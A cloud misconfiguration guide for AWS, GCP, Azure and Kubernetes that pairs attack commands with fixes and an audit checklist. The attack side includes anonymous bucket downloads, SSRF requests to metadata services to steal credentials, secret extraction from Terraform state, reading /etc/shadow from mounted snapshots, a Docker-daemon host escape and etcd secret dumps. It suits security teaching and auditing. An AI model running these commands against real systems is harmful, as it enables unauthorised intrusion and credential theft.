# Cloud Misconfigurations Deep Dive

## 1. S3 Bucket Misconfigurations

### 1.1 Public Access Misconfiguration

```bash
# === Discovery ===

# Enumerate S3 buckets via CT/DNS brute force
# Common patterns: company-name, company-backup, company-assets, company-data
aws s3 ls s3://company-backup --no-sign-request 2>/dev/null && echo "PUBLIC!"

# Mass enumeration tools
python3 -m pip install bucket-finder
bucket_finder wordlist.txt --region us-east-1

# Using s3scanner
s3scanner scan --buckets-file wordlist.txt

# Grayhat Warfare: buckets.grayhatwarfare.com (indexed public buckets)
# Grep for sensitive files
curl -s "https://buckets.grayhatwarfare.com/api/v1/files?keywords=.env&access_key=<key>" | jq .

# === Exploitation ===

# List publicly accessible bucket
aws s3 ls s3://target-bucket --no-sign-request
aws s3 ls s3://target-bucket/ --no-sign-request --recursive

# Download files
aws s3 cp s3://target-bucket/config.env . --no-sign-request
aws s3 sync s3://target-bucket . --no-sign-request

# Check if write is possible (data exfiltration via own bucket, or deface)
echo "test" | aws s3 cp - s3://target-bucket/test.txt --no-sign-request

# Check ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
# Response with "AllUsers" URI = public read/write

# Check public access block settings
aws s3api get-public-access-block --bucket target-bucket

# === Common files to look for ===
# .env, .env.production, config.yml, credentials.json
# database-backup.sql, dump.sql, *.rds
# id_rsa, *.pem, *.pfx, *.p12
# htpasswd, shadow, passwd
# config.json (cloud credentials)
# terraform.tfstate (contains ALL resource details, sometimes passwords)
# backup.tar.gz, *.zip

# === Fix ===
# Enable Block Public Access at account level (recommended)
aws s3api put-public-access-block \
    --bucket my-bucket \
    --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# Or via Terraform
resource "aws_s3_bucket_public_access_block" "example" {
  bucket = aws_s3_bucket.example.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

### 1.2 S3 Bucket Policy Misconfigurations

```json
// VULNERABLE: Principal "*" without condition
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::my-bucket/*"
        }
    ]
}

// VULNERABLE: Overly permissive with AWS condition (any AWS account)
{
    "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "*"},
        "Action": "s3:*",
        "Resource": ["arn:aws:s3:::my-bucket", "arn:aws:s3:::my-bucket/*"],
        "Condition": {
            "StringEquals": {"aws:PrincipalOrgID": "o-xxxx"}
        }
    }]
}
// Above: any account in org can do anything to bucket

// SECURE: Restrict to specific account and VPC endpoint
{
    "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::123456789:root"},
        "Action": ["s3:GetObject", "s3:PutObject"],
        "Resource": "arn:aws:s3:::my-bucket/*",
        "Condition": {
            "StringEquals": {"aws:SourceVpce": "vpce-12345678"}
        }
    }]
}
```

### 1.3 Terraform State File Exposure

```bash
# Terraform tfstate often contains sensitive data
# Check public S3 backends
aws s3 cp s3://company-terraform-state/prod/terraform.tfstate . --no-sign-request

# Extract credentials from tfstate
cat terraform.tfstate | python3 -c "
import json, sys, re

data = json.load(sys.stdin)
text = json.dumps(data)

# Find potential secrets
patterns = [
    r'password[\"\']*\s*[:=]\s*[\"\']*([^\s\"\',}]+)',
    r'secret[\"\']*\s*[:=]\s*[\"\']*([^\s\"\',}]+)',
    r'access_key[\"\']*\s*[:=]\s*[\"\']*([^\s\"\',}]+)',
    r'private_key[\"\']*\s*[:=]\s*[\"\']*([^\s\"\',}]+)',
]
import re
for p in patterns:
    matches = re.findall(p, text, re.IGNORECASE)
    for m in matches[:5]:
        if len(m) > 8:
            print(f'Found: {m[:50]}')
"

# Fix: use remote backend with encryption + access controls
# terraform {
#   backend "s3" {
#     bucket         = "terraform-state-prod"
#     key            = "network/terraform.tfstate"
#     region         = "us-east-1"
#     encrypt        = true
#     kms_key_id     = "arn:aws:kms:us-east-1:xxx:key/xxx"
#     dynamodb_table = "terraform-lock"
#   }
# }
```

---

## 2. EC2 & Compute Misconfigurations

### 2.1 Security Group Misconfigurations

```bash
# Find overly permissive Security Groups
# Port 22 (SSH) open to 0.0.0.0/0 = critical misconfiguration

aws ec2 describe-security-groups \
    --filters "Name=ip-permission.cidr,Values=0.0.0.0/0" \
    --query "SecurityGroups[?IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0' && (FromPort==\`22\` || FromPort==\`3389\` || FromPort==\`-1\`)]]].[GroupId,GroupName,Description]" \
    --output table

# Find ALL ports open to 0.0.0.0/0
aws ec2 describe-security-groups \
    --query "SecurityGroups[*].[GroupId,GroupName,IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0']]]" \
    --output json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for sg in data:
    for perm in (sg[2] or []):
        from_port = perm.get('FromPort', -1)
        to_port = perm.get('ToPort', -1)
        protocol = perm.get('IpProtocol', '-1')
        if protocol == '-1':
            print(f'CRITICAL: {sg[0]} ({sg[1]}) - ALL TRAFFIC to 0.0.0.0/0')
        else:
            print(f'OPEN: {sg[0]} ({sg[1]}) - {protocol}:{from_port}-{to_port} to 0.0.0.0/0')
"

# Attack: if SSH port 22 open to 0.0.0.0/0 with weak key or password auth
# Attack: if RDP (3389) open - brute force or BlueKeep if unpatched

# Fix: restrict SSH to specific bastion/VPN IP
aws ec2 revoke-security-group-ingress \
    --group-id sg-xxxxx \
    --protocol tcp \
    --port 22 \
    --cidr 0.0.0.0/0

aws ec2 authorize-security-group-ingress \
    --group-id sg-xxxxx \
    --protocol tcp \
    --port 22 \
    --cidr 10.0.0.0/8  # Internal only
```

### 2.2 EC2 User Data Secrets

```bash
# User data (startup scripts) often contain hardcoded credentials
# User data accessible without auth from instance!

# From SSRF or MITM:
curl http://169.254.169.254/latest/user-data

# If SSRF to IMDS:
curl http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/user-data

# What attackers find in user data:
#!/bin/bash
apt-get update
# VULNERABLE: hardcoded credentials
export DB_PASSWORD="SuperSecret123!"
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

mysql -h prod-db.internal -u admin -p"SuperSecret123!" < /tmp/init.sql

# Fix: use SSM Parameter Store or Secrets Manager
#!/bin/bash
DB_PASSWORD=$(aws ssm get-parameter \
    --name /prod/db/password \
    --with-decryption \
    --query 'Parameter.Value' \
    --output text)
```

### 2.3 EBS Volume Exposure

```bash
# Public EBS snapshots - often contain entire disk images
# Search for public snapshots belonging to account
aws ec2 describe-snapshots \
    --owner-ids self \
    --filters "Name=attribute,Values=createVolumePermission" \
    --query "Snapshots[?State=='completed'].[SnapshotId,Description,StartTime]"

# Find all public snapshots (any owner - for recon)
aws ec2 describe-snapshots \
    --filters "Name=description,Values=*backup*" \
    --owner-ids self \
    --query "Snapshots[?Encrypted==\`false\`].[SnapshotId,Description]"

# Exploit: create volume from public snapshot in your own account
aws ec2 create-volume \
    --snapshot-id snap-XXXXXXXX \
    --availability-zone us-east-1a \
    --region us-east-1

# Attach to your instance and mount
aws ec2 attach-volume \
    --volume-id vol-XXXXXXXX \
    --instance-id i-XXXXXXXX \
    --device /dev/sdf

sudo mount /dev/xvdf /mnt/snapshot
ls /mnt/snapshot/etc/passwd
ls /mnt/snapshot/home/
sudo cat /mnt/snapshot/etc/shadow

# Fix: never make snapshots public
# Encrypt all EBS volumes at rest
aws ec2 enable-ebs-encryption-by-default --region us-east-1

# Terraform: enforce encryption
resource "aws_ebs_volume" "example" {
  availability_zone = "us-east-1a"
  size              = 40
  encrypted         = true
  kms_key_id        = aws_kms_key.ebs_key.arn
}
```

---

## 3. IAM Misconfigurations

### 3.1 Overly Permissive IAM Policies

```bash
# Find users/roles with admin access
aws iam list-users --output json | jq -r '.Users[].UserName' | while read user; do
    policies=$(aws iam list-attached-user-policies --user-name "$user" \
        --query "AttachedPolicies[].PolicyArn" --output text)
    if echo "$policies" | grep -q "AdministratorAccess"; then
        echo "ADMIN: $user"
    fi
done

# Find roles with dangerous permissions
aws iam list-roles --query "Roles[*].RoleName" --output text | tr '\t' '\n' | while read role; do
    aws iam list-attached-role-policies --role-name "$role" \
        --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyArn" \
        --output text | grep -v "^$" | while read policy; do
        echo "ADMIN ROLE: $role"
    done
done

# Find inline policies with * permissions
python3 << 'EOF'
import boto3, json

iam = boto3.client('iam')

# Check all user inline policies
for user in iam.get_paginator('list_users').paginate().search('Users[].UserName'):
    for policy_name in iam.list_user_policies(UserName=user)['PolicyNames']:
        doc = iam.get_user_policy(UserName=user, PolicyName=policy_name)['PolicyDocument']
        for stmt in doc.get('Statement', []):
            actions = stmt.get('Action', [])
            if isinstance(actions, str):
                actions = [actions]
            if '*' in actions or 'iam:*' in actions:
                print(f"DANGEROUS: User {user}, Policy {policy_name}: {actions}")
EOF

# Fix: use IAM Access Analyzer
aws accessanalyzer create-analyzer --analyzer-name MyAnalyzer --type ACCOUNT
aws accessanalyzer list-findings --analyzer-arn arn:aws:access-analyzer:... --output table
```

### 3.2 IAM Role Trust Policy Misconfiguration

```json
// VULNERABLE: Trust any AWS account
{
    "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "*"},
        "Action": "sts:AssumeRole"
    }]
}

// VULNERABLE: Trust entire AWS org (implicit)
{
    "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::*:root"},
        "Action": "sts:AssumeRole",
        "Condition": {
            "StringEquals": {"aws:PrincipalOrgID": "o-xxxx"}
        }
    }]
}
// Any account in org, any principal can assume this role

// SECURE: Restrict to specific role in specific account
{
    "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": "arn:aws:iam::123456789012:role/specific-role"},
        "Action": "sts:AssumeRole",
        "Condition": {
            "StringEquals": {"sts:ExternalId": "unique-external-id-12345"},
            "Bool": {"aws:MultiFactorAuthPresent": "true"}
        }
    }]
}
```

### 3.3 Access Key Exposure

```bash
# Attackers search for exposed AWS access keys in:
# - GitHub repos (git history too!)
# - S3 buckets
# - Docker images (history layers)
# - Pastebin / Stack Overflow
# - EC2 user data

# Search GitHub for exposed keys
# trufflehog git https://github.com/company/repo --only-verified

# Check if key is valid
aws sts get-caller-identity --profile found-key

# Find what the compromised key can do
python3 - << 'EOF'
import boto3

# Test common read permissions
session = boto3.Session()
sts = session.client('sts')
identity = sts.get_caller_identity()
print(f"Account: {identity['Account']}")
print(f"ARN: {identity['Arn']}")

# Test S3 access
s3 = session.client('s3')
try:
    buckets = s3.list_buckets()
    print(f"S3 buckets accessible: {[b['Name'] for b in buckets['Buckets']]}")
except Exception as e:
    print(f"S3: {e}")

# Test EC2
ec2 = session.client('ec2', region_name='us-east-1')
try:
    instances = ec2.describe_instances()
    print(f"EC2 instances visible: {len(instances['Reservations'])}")
except Exception as e:
    print(f"EC2: {e}")
EOF

# Response to exposed key:
# 1. Immediately deactivate key (NOT delete - you need the audit trail)
aws iam update-access-key --access-key-id AKIA... --status Inactive --user-name affected-user

# 2. Check CloudTrail for last 90 days of activity
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIA... \
    --start-time 2024-01-01 \
    --output json | jq '.Events[] | {time: .EventTime, event: .EventName, source: .EventSource}'

# 3. Check for new users/roles created
aws iam list-users --query "Users[?CreateDate>='2024-01-01'].UserName"

# 4. Rotate all keys, revoke sessions
aws iam delete-access-key --access-key-id AKIA... --user-name affected-user
```

---

## 4. Metadata Service (IMDS) Attacks

### 4.1 IMDSv1 Exploitation

```bash
# EC2 Instance Metadata Service - accessible from instance on 169.254.169.254
# IMDSv1: unauthenticated GET requests (dangerous!)

# From SSRF vulnerability:
# Step 1: Get temporary credentials
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: "MyAppRole"

curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole"
# Response:
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-15T16:00:00Z"
}

# Step 2: Use credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity

# Other useful IMDS endpoints:
curl "http://169.254.169.254/latest/user-data"              # Startup scripts (may have secrets)
curl "http://169.254.169.254/latest/meta-data/hostname"
curl "http://169.254.169.254/latest/meta-data/local-ipv4"
curl "http://169.254.169.254/latest/meta-data/public-ipv4"
curl "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"  # SSH public key
curl "http://169.254.169.254/latest/meta-data/placement/region"

# Fix: enforce IMDSv2 (requires token)
aws ec2 modify-instance-metadata-options \
    --instance-id i-xxx \
    --http-tokens required \
    --http-put-response-hop-limit 1

# Terraform: require IMDSv2
resource "aws_instance" "example" {
  ami           = "ami-xxx"
  instance_type = "t3.micro"
  
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"  # IMDSv2 only
    http_put_response_hop_limit = 1           # No proxy/container relay
  }
}
```

### 4.2 Container Metadata Service

```bash
# ECS Task Metadata (similar attack surface)
# ECS containers: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
# Returns temporary credentials for task role

# EKS: IRSA (IAM Roles for Service Accounts) via token projection
# Pod has /var/run/secrets/eks.amazonaws.com/serviceaccount/token
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# GCP: Metadata server at 169.254.169.254 or metadata.google.internal
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -H "Metadata-Flavor: Google"

curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
    -H "Metadata-Flavor: Google"

# Azure: IMDS at 169.254.169.254
curl -H "Metadata:true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## 5. GCP Misconfigurations

### 5.1 GCP Storage Misconfigurations

```bash
# GCS (Google Cloud Storage) public buckets
# allUsers or allAuthenticatedUsers = public

# Check bucket permissions
gsutil iam get gs://target-bucket

# VULNERABLE IAM policy output:
{
  "bindings": [
    {
      "members": ["allUsers"],
      "role": "roles/storage.objectViewer"  # Public read!
    },
    {
      "members": ["allAuthenticatedUsers"],
      "role": "roles/storage.objectAdmin"   # Any Google account = write!
    }
  ]
}

# List publicly accessible bucket (no auth)
gsutil ls gs://target-bucket/
curl https://storage.googleapis.com/target-bucket/

# GrayhatWarfare for GCS:
# https://buckets.grayhatwarfare.com/buckets?prefix=target

# Fix: remove public access
gsutil iam ch -d allUsers gs://my-bucket
gsutil iam ch -d allAuthenticatedUsers gs://my-bucket

# Uniform bucket-level access (recommended - disables ACLs)
gsutil uniformbucketlevelaccess set on gs://my-bucket
```

### 5.2 GCP IAM Misconfigurations

```bash
# Find overly permissive IAM bindings
gcloud projects get-iam-policy my-project --format=json | python3 -c "
import json, sys

policy = json.load(sys.stdin)
dangerous_roles = [
    'roles/owner', 'roles/editor',
    'roles/iam.securityAdmin', 'roles/resourcemanager.projectIamAdmin',
    'roles/compute.admin', 'roles/container.admin'
]

for binding in policy.get('bindings', []):
    role = binding['role']
    members = binding['members']
    
    for member in members:
        if 'allUsers' in member or 'allAuthenticatedUsers' in member:
            print(f'PUBLIC ACCESS: {role} -> {member}')
        
        if role in dangerous_roles and 'serviceAccount' in member:
            print(f'OVERPRIVILEGED SA: {role} -> {member}')
"

# Service Account key files (should not exist)
gcloud iam service-accounts keys list \
    --iam-account sa@my-project.iam.gserviceaccount.com

# User-managed keys are risky - prefer Workload Identity
# Fix: delete unnecessary keys
gcloud iam service-accounts keys delete KEY_ID \
    --iam-account sa@my-project.iam.gserviceaccount.com

# Workload Identity (like AWS IRSA) - no key files needed
gcloud iam service-accounts add-iam-policy-binding \
    sa@my-project.iam.gserviceaccount.com \
    --role roles/iam.workloadIdentityUser \
    --member "serviceAccount:my-project.svc.id.goog[namespace/k8s-sa]"
```

### 5.3 GCP Compute Misconfigurations

```bash
# Check for VMs with public IPs and open SSH
gcloud compute instances list \
    --format="table(name,status,networkInterfaces[].accessConfigs[].natIP)" \
    | grep -v "^None$"

# Check for project-wide SSH keys (risky - applies to all VMs)
gcloud compute project-info describe \
    --format="json" | jq '.commonInstanceMetadata.items[] | select(.key=="ssh-keys")'

# Firewall rules: 0.0.0.0/0 on dangerous ports
gcloud compute firewall-rules list \
    --format="table(name,direction,priority,sourceRanges.list():label=SRC_RANGES,allowed[].map().firewall_rule().list():label=ALLOW,targetTags.list():label=TARGET_TAGS)" \
    | grep "0.0.0.0/0"

# Serial port access (debug backdoor)
gcloud compute instances describe my-instance \
    --format="json" | jq '.metadata.items[] | select(.key=="serial-port-enable")'
# If "1" = serial port accessible (potential backdoor)

# Disable serial port access
gcloud compute instances add-metadata my-instance \
    --metadata serial-port-enable=false
```

---

## 6. Azure Misconfigurations

### 6.1 Azure Storage Misconfigurations

```bash
# Azure Blob Storage with public access
# Check storage account settings
az storage account list \
    --query "[].{Name:name,AllowBlobPublicAccess:allowBlobPublicAccess}" \
    --output table

# List containers with public access
az storage container list \
    --account-name mystorageaccount \
    --query "[?properties.publicAccess!='None'].{Name:name,Access:properties.publicAccess}" \
    --output table

# Access public blob
curl "https://mystorageaccount.blob.core.windows.net/public-container/file.txt"

# Enumerate azure blob storage
python3 -c "
import requests

account = 'targetcompany'
container = 'backups'

# Try common patterns
for container in ['backups', 'data', 'assets', 'public', 'uploads', 'logs']:
    url = f'https://{account}.blob.core.windows.net/{container}?restype=container&comp=list'
    r = requests.get(url)
    if r.status_code == 200:
        print(f'ACCESSIBLE: {url}')
        # Parse XML for blob names
"

# Fix: disable public blob access
az storage account update \
    --name mystorageaccount \
    --resource-group myRG \
    --allow-blob-public-access false
```

### 6.2 Azure AD / Entra ID Misconfigurations

```bash
# Find service principals with overly permissive roles
az role assignment list \
    --all \
    --query "[?principalType=='ServicePrincipal' && (roleDefinitionName=='Owner' || roleDefinitionName=='Contributor')].[principalName,roleDefinitionName,scope]" \
    --output table

# Find users with MFA not enabled
# Requires Microsoft Graph API
# Use: aad-attack-toolkit, ROADtools

# Managed Identity credentials exposure
# From SSRF: GET http://169.254.169.254/metadata/identity/oauth2/token
# Endpoint returns Azure access tokens

# Attack: ClientSecrets stored in code/repos
# Application credentials in Azure App Registrations
az ad app list --query "[].{Name:displayName,AppId:appId}" --output table

# Find apps with expired credentials (forgotten but still present)
az ad app list --output json | python3 -c "
import json, sys
from datetime import datetime

apps = json.load(sys.stdin)
now = datetime.utcnow()
for app in apps:
    for cred in app.get('passwordCredentials', []):
        end_date = cred.get('endDateTime', '')
        if end_date:
            exp = datetime.fromisoformat(end_date.replace('Z', ''))
            if exp < now:
                print(f'EXPIRED CRED: {app[\"displayName\"]} - expired {end_date}')
"
```

---

## 7. Container & Kubernetes Misconfigurations

### 7.1 Docker Daemon Exposure

```bash
# Exposed Docker daemon (port 2375 or 2376 without TLS)
curl http://target:2375/v1.41/containers/json  # List containers
curl http://target:2375/v1.41/images/json      # List images

# Full exploitation:
DOCKER_HOST=tcp://target:2375 docker ps
DOCKER_HOST=tcp://target:2375 docker images

# Escape to host via privileged container
DOCKER_HOST=tcp://target:2375 docker run --rm -it \
    --privileged \
    --pid=host \
    -v /:/host \
    ubuntu:latest \
    chroot /host bash
# Now running as root on the host!

# Fix: never expose Docker socket without TLS
# Use Docker TLS authentication
dockerd --tlsverify \
    --tlscacert=ca.pem \
    --tlscert=server-cert.pem \
    --tlskey=server-key.pem \
    -H=0.0.0.0:2376
```

### 7.2 Kubernetes API Server Exposure

```bash
# Unauthenticated API server (anonymous access enabled)
curl https://k8s-api:6443/api/v1/namespaces --insecure

# Check if anonymous access is enabled
kubectl get --as=system:anonymous clusterroles

# List all resources accessible anonymously
kubectl auth can-i --list --as=system:anonymous

# Over-permissive RBAC
kubectl get clusterrolebindings -o json | python3 -c "
import json, sys

data = json.load(sys.stdin)
for crb in data['items']:
    subjects = crb.get('subjects', [])
    role_ref = crb.get('roleRef', {})
    
    for subject in subjects:
        if subject.get('name') in ['system:anonymous', 'system:unauthenticated', 'system:authenticated']:
            print(f'WARNING: {subject[\"name\"]} has {role_ref[\"name\"]}')
        if subject.get('kind') == 'Group' and subject.get('name') == 'system:masters':
            print(f'ADMIN GROUP: {crb[\"metadata\"][\"name\"]}')
"

# Exposed etcd (port 2379) - bypass API auth entirely
etcdctl --endpoints=http://etcd:2379 get / --prefix --keys-only
# etcd contains all K8s secrets, tokens, configs

# Check kubectl default namespace
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
```

---

## 8. Automated Cloud Security Scanning

### 8.1 AWS Scanning Tools

```bash
# Prowler - AWS security best practices
pip install prowler
prowler aws --profile default -r us-east-1

# Generate HTML report
prowler aws --output-formats html,csv,json

# Run specific checks
prowler aws --checks check12 check23 check45  # specific CIS checks

# ScoutSuite - multi-cloud
pip install scoutsuite
scout aws --report-dir ./scout-report

# Pacu - AWS exploitation framework
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu && pip install -r requirements.txt
python3 pacu.py

# In Pacu:
# set_keys
# run iam__enum_users_roles_policies_groups
# run iam__privesc_scan
# run s3__bucket_finder

# CloudMapper - visualize attack paths
pip install cloudmapper
python3 cloudmapper.py collect --account default
python3 cloudmapper.py webserver
```

### 8.2 Multi-Cloud Scanning

```bash
# Checkov - IaC scanning
pip install checkov

# Scan Terraform
checkov -d . --framework terraform \
    --check CKV_AWS_18,CKV_AWS_19,CKV_AWS_20 \
    --output json > checkov-results.json

# Scan CloudFormation
checkov -f cloudformation.yaml --framework cloudformation

# KICS (Keeping Infrastructure as Code Secure)
docker run -t -v "$(pwd):/path" checkmarx/kics scan \
    -p /path \
    -o /path/results \
    --report-formats json,html

# tfsec
tfsec . --format lovely

# terraform-compliance
pip install terraform-compliance
terraform-compliance -p tfplan.json -f compliance/

# Example compliance rule:
# features/s3_encryption.feature
Feature: S3 Security
  Scenario: Ensure S3 buckets are encrypted
    Given I have aws_s3_bucket defined
    Then it must contain server_side_encryption_configuration
    And its rule must contain apply_server_side_encryption_by_default
    And its sse_algorithm must be "aws:kms"
```

### 8.3 Real-Time Detection

```bash
# CloudTrail anomaly detection with AWS Config
aws configservice put-config-rule --config-rule '{
    "ConfigRuleName": "s3-bucket-public-read-prohibited",
    "Source": {
        "Owner": "AWS",
        "SourceIdentifier": "S3_BUCKET_PUBLIC_READ_PROHIBITED"
    }
}'

# GuardDuty findings for cloud threats
aws guardduty list-findings \
    --detector-id <detector-id> \
    --finding-criteria '{
        "Criterion": {
            "severity": {"Gte": 7},
            "service.archived": {"Eq": ["false"]}
        }
    }'

# CloudWatch alert for root login
aws cloudwatch put-metric-alarm \
    --alarm-name RootLoginAlarm \
    --alarm-description "Alert on root account usage" \
    --metric-name RootAccountUsage \
    --namespace CloudTrailMetrics \
    --statistic Sum \
    --period 300 \
    --threshold 1 \
    --comparison-operator GreaterThanOrEqualToThreshold \
    --evaluation-periods 1 \
    --alarm-actions arn:aws:sns:us-east-1:xxx:security-alerts

# Security Hub - aggregate findings
aws securityhub enable-security-hub
aws securityhub get-findings \
    --filters '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}' \
    --output table
```

---

## 9. Checklist: Cloud Misconfiguration Audit

### AWS Checklist

```
Storage:
□ All S3 buckets have Block Public Access enabled at account level
□ S3 bucket policies don't allow s3:* for all principals
□ S3 server-side encryption enabled (SSE-KMS preferred)
□ S3 access logging enabled for sensitive buckets
□ No publicly accessible EBS snapshots
□ EBS default encryption enabled

Identity:
□ Root account has MFA; no root access keys
□ No IAM users (use SSO/Identity Center instead)
□ All IAM users have MFA
□ No access keys older than 90 days
□ Least-privilege IAM policies (no Action:* or wildcard resources)
□ IAM roles use permission boundaries
□ Service Control Policies (SCPs) configured

Compute:
□ No security groups with 0.0.0.0/0 on SSH (22) or RDP (3389)
□ All EC2 instances use IMDSv2
□ No credentials in user data or instance metadata
□ All EBS volumes encrypted

Networking:
□ VPC Flow Logs enabled
□ No public subnets without need
□ VPC endpoints for S3/DynamoDB/SSM (no internet required)
□ NACLs configured alongside security groups

Logging/Monitoring:
□ CloudTrail enabled in all regions (multi-region trail)
□ CloudTrail logs integrity validation enabled
□ CloudTrail logs encrypted with KMS
□ GuardDuty enabled
□ Security Hub enabled
□ Config enabled with conformance packs
□ CloudWatch alarms for critical events (root login, MFA changes)
```

---

## Quick Reference: Common Findings

| Misconfiguration | Risk | Quick Check |
|-----------------|------|-------------|
| Public S3 bucket | Data exposure | `aws s3api get-bucket-policy-status` |
| SSH 0.0.0.0/0 | RCE from internet | `aws ec2 describe-security-groups` |
| IMDSv1 enabled | SSRF → credential theft | Instance metadata options |
| No MFA on root | Full account takeover | IAM console |
| Public EBS snapshot | Data exposure | `aws ec2 describe-snapshots` |
| Expired access keys | Credential exposure | `aws iam list-access-keys` |
| CloudTrail disabled | Blind to attacks | `aws cloudtrail get-trail-status` |
| No GuardDuty | No threat detection | GuardDuty console |
| Terraform state in public S3 | Infra secrets exposed | `aws s3 ls s3://terraform-state --no-sign-request` |
| Service account key files | Credential exposure | `gcloud iam service-accounts keys list` |
